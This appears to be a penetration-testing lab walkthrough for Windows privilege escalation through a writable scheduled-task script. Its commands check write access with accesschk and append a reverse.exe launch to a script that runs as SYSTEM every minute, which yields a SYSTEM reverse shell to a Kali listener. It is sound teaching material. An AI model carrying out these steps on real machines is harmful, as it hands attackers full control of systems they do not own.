# 🐾 13. Task Scheduler

## 📜 Task Description
In this task, we will work with the Windows Task Scheduler. The script `C:\DevTools\CleanUp.ps1` runs every minute with SYSTEM privileges. We will modify its contents to add a command to launch a reverse shell with SYSTEM privileges.

---

## 🔍 Step 1: View the contents of the CleanUp.ps1 script
First, let's view the contents of the `C:\DevTools\CleanUp.ps1` script:

'`type C:\DevTools\CleanUp.ps1`'

### 📋 Expected Output
- Ensure that you can see the contents of the `CleanUp.ps1` script, which will be executed under the SYSTEM account every minute.

## 🔑 Step 2: Check write permissions to the file
Using the `accesschk.exe` tool, check if you have write permissions to the `CleanUp.ps1` file:

'`C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1`'

### 📋 Expected Output
- Ensure that you have write permissions to the file, which will allow you to modify its contents.

## 📝 Step 3: Add the reverse shell command
Now, while running a listener on Kali, add a line to the `C:\DevTools\CleanUp.ps1` file to launch your executable `reverse.exe` with SYSTEM privileges:

'`echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1`'

### 📋 Expected Output
- Ensure that the line with the reverse shell launch command was successfully added to the file.

---

## 🎯 Step 4: Wait for the task to run
Wait for the task scheduler to execute the task, which should lead to the reverse shell being launched with SYSTEM privileges.

### 📋 Expected Output
- Ensure that the reverse shell was successfully launched and you gained access to the machine with SYSTEM privileges.

## 🎉 Congratulations!
You have successfully modified the task scheduler and gained SYSTEM-level access to the machine through a reverse shell! 🎊

## 📌 Notes
- Be careful when using the knowledge gained, always act within the boundaries of authorized penetration testing.
